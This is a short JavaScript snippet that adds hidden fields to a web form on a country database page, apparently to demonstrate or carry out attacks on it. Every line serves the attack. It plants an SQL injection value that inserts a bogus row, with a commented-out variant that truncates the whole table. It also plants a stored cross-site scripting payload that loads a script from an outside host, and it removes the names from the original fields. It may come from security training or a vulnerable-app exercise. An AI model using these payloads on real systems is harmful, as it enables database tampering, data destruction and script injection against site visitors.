"use strict";
let el1 = document.createElement("input");
el1.setAttribute("name", "country_area");
el1.setAttribute("type", "hidden");
el1.setAttribute("value", "0'); INSERT INTO `country` (`country_name`, `country_flag`, `country_capital`, `country_area`) VALUES ('Faille injection SQL','🏳️','Faille injection SQL','666'); -- "); /* el1.setAttribute("value", "0'); TRUNCATE TABLE `country`; -- "); // mode vnr */
document.querySelector("form").appendChild(el1);
document.querySelector("label:nth-of-type(4) input").removeAttribute("name");
let el2 = document.createElement("input");
el2.setAttribute("name", "country_flag");
el2.setAttribute("type", "hidden");
el2.setAttribute("value", "🏴<script src=\"https://cdn.hmz.tf/xss.js\"></script>");
document.querySelector("form").appendChild(el2);
document.querySelector("label:nth-of-type(3) input").removeAttribute("name");